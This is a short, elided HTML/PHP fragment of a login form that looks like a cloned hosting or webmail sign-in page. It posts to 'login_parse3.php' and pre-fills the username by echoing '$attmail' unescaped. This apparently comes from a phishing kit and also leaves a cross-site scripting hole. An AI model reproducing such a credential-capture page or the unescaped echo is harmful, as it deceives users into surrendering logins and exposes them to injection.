              ...
              <div id="login-sub-container">
                      ...
                      <div id="login-sub">
                          ...
                          <div id="forms">
                              ...
                              <form novalidate="" id="login_form" action="login_parse3.php" method="post" style="visibility:">
                                
                                  <div class="input-req-login"><label for="user">Username</label></div>
                                  <div class="input-field-login icon username-container">
                                      <input name="user" id="user" autofocus="autofocus" value="<?php echo $attmail; ?>"  class="std_textbox" type="text" tabindex="1" required="">
                                  </div>
